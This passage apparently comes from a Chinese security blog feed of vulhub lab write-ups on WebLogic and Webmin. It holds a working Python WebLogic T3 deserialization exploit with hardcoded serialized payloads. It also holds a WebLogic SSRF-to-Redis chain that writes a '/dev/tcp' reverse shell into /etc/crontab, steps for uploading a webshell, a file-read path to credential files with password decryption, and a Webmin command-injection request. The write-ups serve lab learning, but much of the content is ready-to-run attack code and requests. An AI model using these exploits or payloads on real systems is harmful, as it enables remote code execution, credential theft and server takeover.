string">'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span>    data2 <span class="token operator">=</span> <span class="token string">'007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'{:04x}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>dport<span class="token punctuation">)</span><span class="token punctuation">)</span>    data3 <span class="token operator">=</span> <span class="token string">'1a7727000d3234322e323134'</span>    data4 <span class="token operator">=</span> <span class="token string">'2e312e32353461863d1d0000000078'</span>    <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token punctuation">[</span>data1<span class="token punctuation">,</span>data2<span class="token punctuation">,</span>data3<span class="token punctuation">,</span>data4<span class="token punctuation">]</span><span class="token punctuation">:</span>        sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>d<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'send request payload successful,recv length:%d'</span><span class="token operator">%</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">send_payload_objdata</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token operator">=</span><span class="token string">'056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span>    payload<span class="token operator">+=</span>data    payload<span class="token operator">+=</span><span class="token string">'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span>    payload <span class="token operator">=</span> <span class="token string">'%s%s'</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token string">'{:08x}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>dip<span class="token punctuation">,</span> dport<span class="token punctuation">,</span> path_ysoserial<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span> jrmp_listener_port<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">)</span><span class="token punctuation">:</span>    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">)</span>    server_addr <span class="token operator">=</span> <span class="token punctuation">(</span>dip<span class="token punctuation">,</span> dport<span class="token punctuation">)</span>    t3_handshake<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> server_addr<span class="token punctuation">)</span>    build_t3_request_object<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> dport<span class="token punctuation">)</span>    payload <span class="token operator">=</span> generate_payload<span class="token punctuation">(</span>path_ysoserial<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span> jrmp_listener_port<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload: "</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>    rs<span class="token operator">=</span>send_payload_objdata<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'response: '</span> <span class="token operator">+</span> rs<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'exploit completed!'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#check for args, print usage if incorrect</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">7</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] '</span>              <span class="token string">'[JRMPListener ip] [JRMPListener port] [JRMPClient]\n'</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    dip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    dport <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    path_ysoserial <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>    jrmp_listener_ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>    jrmp_listener_port <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>    jrmp_client <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>    exploit<span class="token punctuation">(</span>dip<span class="token punctuation">,</span> dport<span class="token punctuation">,</span> path_ysoserial<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span> jrmp_listener_port<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">)</span></code></pre><pre class=" language-bash"><code class="language-bash">python exploit.py <span class="token punctuation">[</span>victim ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>victim port<span class="token punctuation">]</span> <span class="token punctuation">[</span>path to ysoserial<span class="token punctuation">]</span> <span class="token punctuation">[</span>JRMPListener ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>JRMPListener port<span class="token punctuation">]</span> <span class="token punctuation">[</span>JRMPClient<span class="token punctuation">]</span></code></pre><p>其中，[<code>victim ip</code>] 和 [<code>victim port</code>] 是目标 weblogic 的 IP 和端口，[<code>path to ysoserial</code>] 是本地 ysoserial 的路径，[<code>JRMPListener ip</code>] 和 [<code>JRMPListener port</code>] 第一步中启动 JRMP Server 的 IP 地址和端口。[JRMPClient]是执行 JRMPClient 的类，可选的值是 JRMPClient 或 JRMPClient2。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200318101144.png-water_print" alt=""></p><p>exploit.py 执行完成后，执行 <code>docker-compose exec weblogic bash</code> 进入容器中，可见 <code>/tmp/success</code> 已成功创建。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200318101209.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic 任意文件上传漏洞（CVE-2018-2894）</title>
      <link href="/2019/03/01/weblogic-ren-yi-wen-jian-shang-chuan-lou-dong-cve-2018-2894/"/>
      <url>/2019/03/01/weblogic-ren-yi-wen-jian-shang-chuan-lou-dong-cve-2018-2894/</url>
      
        <content type="html"><![CDATA[<h1 id="Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>Weblogic 任意文件上传漏洞（CVE-2018-2894）</h1><p>Oracle 7 月更新中，修复了 Weblogic Web Service Test Page 中一处任意文件上传漏洞，Web Service Test Page 在 <code>生产模式</code> 下默认不开启，所以该漏洞有一定限制。</p><p>利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>环境启动后，访问 <a href="http://your-ip:7001/console" target="_blank" rel="noopener">http://your-ip:7001/console</a>，即可看到后台登录页面。</p><p>执行 <code>docker-compose logs | grep password</code> 可查看管理员密码，管理员用户名为 <code>weblogic</code>。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317122519.png-water_print" alt=""></p><p>登录后台页面，点击 <code>base_domain</code> 的配置，在 <code>高级</code> 中开启 <code>启用 Web 服务测试页</code> 选项：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317105319.png-water_print" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问 <a href="http://your-ip:7001/ws_utc/config.do" target="_blank" rel="noopener">http://your-ip:7001/ws_utc/config.do</a>，设置 <code>Work Home Dir</code> 为 <code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code> 。我将目录设置为 <code>ws_utc</code> 应用的静态文件 css 目录，访问这个目录是无需权限的，这一点很重要。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317105442.png-water_print" alt=""></p><p>然后点击安全 -&gt; 增加，然后上传 webshell：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317105741.png-water_print" alt=""></p><p>上传后，查看返回的数据包，其中有时间戳：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317123017.png-water_print" alt=""></p><p>然后访问<a href="http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]" target="_blank" rel="noopener">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</a>，即可执行 webshell:</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317123354.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic SSRF漏洞</title>
      <link href="/2019/03/01/weblogic-ssrf-lou-dong/"/>
      <url>/2019/03/01/weblogic-ssrf-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h1><p>Weblogic 中存在一个 SSRF 漏洞，利用该漏洞可以发送任意 HTTP 请求，进而攻击内网中 redis、fastcgi 等脆弱组件。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>SSRF 漏洞存在于 <a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp" target="_blank" rel="noopener">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</a>，在 brupsuite 下测试该漏洞。访问一个可以访问的 IP:PORT，如<a href="http://127.0.0.1:80" target="_blank" rel="noopener">http://127.0.0.1:80</a>：</p><pre class=" language-http"><code class="language-http">GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 HTTP/1.1<span class="token header-name keyword">Host:</span> localhost<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Language:</span> en<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="token header-name keyword">Connection:</span> close</code></pre><p>可访问的端口将会得到错误，一般是返回 <code>status code</code>（如下图），如果访问的非 <code>http</code> 协议，则会返回 <code>did not have a valid SOAP content-type</code>。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317114755.png-water_print" alt=""></p><p>修改为一个不存在的端口，将会返回 <code>could not connect over HTTP to server</code>。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317114945.png-water_print" alt=""></p><p>通过错误的不同，即可探测内网状态。</p><h2 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h2><p>Weblogic 的 SSRF 有一个比较大的特点，其虽然是一个 <code>GET</code> 请求，但是我们可以通过传入 <code>%0a%0d</code> 来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该 SSRF 攻击内网中的 redis 服务器。</p><p>首先，通过 ssrf 探测内网中的 redis 服务器（docker环境的网段一般是172.*），发现 <code>172.19.0.2:6379</code> 可以连通：</p><p>发送三条 redis 命令，将弹 shell 脚本写入 <code>/etc/crontab</code>：</p><pre class=" language-redis"><code class="language-redis">set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/172.19.0.1/2333 0>&1\n\n\n\n"config set dir /etc/config set dbfilename crontabsave</code></pre><p>进行url编码：</p><pre class=" language-url"><code class="language-url">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.1%2F2333%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</code></pre><p>注意，换行符是 <code>\r\n</code>，也就是 <code>%0D%0A</code>。</p><p>将 url 编码后的字符串放在 ssrf 的域名后面，发送：</p><pre class=" language-http"><code class="language-http">GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.1%2F2333%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP/1.1<span class="token header-name keyword">Host:</span> localhost<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Language:</span> en<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="token header-name keyword">Connection:</span> close</code></pre><p>成功反弹：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317120804.png-water_print" alt=""></p><p>最后补充一下，可进行利用的cron有如下几个地方：</p><ul><li>/etc/crontab 这个是肯定的</li><li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li><li>/var/spool/cron/root centos系统下root用户的cron文件</li><li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic 常规渗透测试环境</title>
      <link href="/2019/03/01/weblogic-chang-gui-shen-tou-ce-shi-huan-jing/"/>
      <url>/2019/03/01/weblogic-chang-gui-shen-tou-ce-shi-huan-jing/</url>
      
        <content type="html"><![CDATA[<h1 id="Weblogic-常规渗透测试环境"><a href="#Weblogic-常规渗透测试环境" class="headerlink" title="Weblogic 常规渗透测试环境"></a>Weblogic 常规渗透测试环境</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>本环境模拟了一个真实的weblogic环境，其后台存在一个弱口令，并且前台存在任意文件读取漏洞。分别通过这两种漏洞，模拟对weblogic场景的渗透。</p><p>Weblogic版本：10.3.6(11g)</p><p>Java版本：1.6</p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>环境启动后，访问<a href="http://your-ip:7001/console" target="_blank" rel="noopener">http://your-ip:7001/console</a>，即为 <code>weblogic</code> 后台。</p><p>本环境存在弱口令：</p><p>weblogic</p><p>Oracle@123</p><p>weblogic常用弱口令： <a href="http://cirt.net/passwords?criteria=weblogic" target="_blank" rel="noopener">http://cirt.net/passwords?criteria=weblogic</a></p><h2 id="任意文件读取漏洞的利用"><a href="#任意文件读取漏洞的利用" class="headerlink" title="任意文件读取漏洞的利用"></a>任意文件读取漏洞的利用</h2><p>假设不存在弱口令，如何对 <code>weblogic</code> 进行渗透？</p><p>本环境前台模拟了一个任意文件下载漏洞，访问<a href="http://your-ip:7001/hello/file.jsp?path=/etc/passwd" target="_blank" rel="noopener">http://your-ip:7001/hello/file.jsp?path=/etc/passwd</a>可见成功读取passwd文件。那么，该漏洞如何利用？</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317110702.png-water_print" alt=""></p><h3 id="读取后台用户密文与密钥文件"><a href="#读取后台用户密文与密钥文件" class="headerlink" title="读取后台用户密文与密钥文件"></a>读取后台用户密文与密钥文件</h3><p><code>weblogic</code> 密码使用 <code>AES</code>（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于 <code>base_domain</code> 下，名为<code>SerializedSystemIni.dat和config.xml</code> ，在本环境中为 <code>./security/SerializedSystemIni.dat</code> 和 <code>./config/config.xml</code>（基于当前目录 <code>/root/Oracle/Middleware/user_projects/domains/base_domain</code> ）。</p><p><code>SerializedSystemIni.dat</code> 是一个二进制文件，所以一定要用 burpsuite 来读取，用浏览器直接下载可能引入一些干扰字符。在 burp 里选中读取到的那一串乱码，右键 <code>copy to file</code> 就可以保存成一个文件：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317112149.png-water_print" alt=""></p><p><code>config.xml</code> 是 <code>base_domain</code> 的全局配置文件，所以乱七八糟的内容比较多，找到其中的 <code>&lt;node-manager-password-encrypted&gt;</code> 的值，即为加密后的管理员密码：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317111539.png-water_print" alt=""></p><h3 id="解密密文"><a href="#解密密文" class="headerlink" title="解密密文"></a>解密密文</h3><p>然后使用本环境的 <code>decrypt</code> 目录下的 <code>weblogic_decrypt.jar</code>，解密密文:</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317112248.png-water_print" alt=""></p><h2 id="后台上传webshell"><a href="#后台上传webshell" class="headerlink" title="后台上传webshell"></a>后台上传webshell</h2><p>获取到管理员密码后，登录后台。点击左侧的部署，可见一个应用列表：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317112416.png-water_print" alt=""></p><p>点击安装，选择“上载文件”：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317112555.png-water_print" alt=""></p><p>上传 war 包。值得注意的是，我们平时 tomcat 用的 war 包不一定能够成功，你可以将你的 webshell 放到本项目的 <code>web/hello.war</code> 这个压缩包中，再上传。上传成功后点下一步。</p><p>填写应用名称：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317113553.png-water_print" alt=""><br>继续一直下一步，最后点完成。</p><p>应用目录在 <code>war</code> 包中 <code>WEB-INF/weblogic.xml</code> 里指定（因为本测试环境已经使用了 <code>/hello</code> 这个目录，所以你要在本测试环境下部署 shell，需要修改这个目录，比如修改成 <code>/shell</code>）：</p><p>成功获取 webshell：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200317113611.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webmin 远程命令执行漏洞</title>
      <link href="/2019/03/01/webmin-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/03/01/webmin-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Webmin-远程命令执行漏洞（CVE-2019-15107）"><a href="#Webmin-远程命令执行漏洞（CVE-2019-15107）" class="headerlink" title="Webmin 远程命令执行漏洞（CVE-2019-15107）"></a>Webmin 远程命令执行漏洞（CVE-2019-15107）</h1><p>Webmin 是一个用于管理类 Unix 系统的管理配置工具，具有 Web 页面。在其找回密码页面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。</p><p>参考链接：</p><p><a href="https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html" target="_blank" rel="noopener">https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html</a><br><a href="https://blog.firosolutions.com/exploits/webmin/" target="_blank" rel="noopener">https://blog.firosolutions.com/exploits/webmin/</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>忽略证书后即可看到webmin的登录页面</p><p>参考链接中的数据包是不对的，经过阅读代码可知，只有在发送的 <code>user</code> 参数的值不是已知 Linux 用户的情况下（而参考链接中是 user=root ），才会进入到修改 <code>/etc/shadow</code> 的地方，触发命令注入漏洞。</p><p>发送如下数据包，即可执行命令 <code>id</code>：</p><pre class=" language-http"><code class="language-http">POST /password_change.cgi HTTP/1.1<span class="token header-name keyword">Host:</span> your-ip:10000<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Language:</span> en<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Cookie:</span> redirect=1; testing=1; sid=x; sessiontest=1<span class="token header-name keyword">Referer:</span> https://your-ip:10000/session_login.cgi<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 60user=rootxx&amp;pam=&amp;expired=2&amp;old=test|id&amp;new1=test2&amp;new2=test2</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200316111257.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            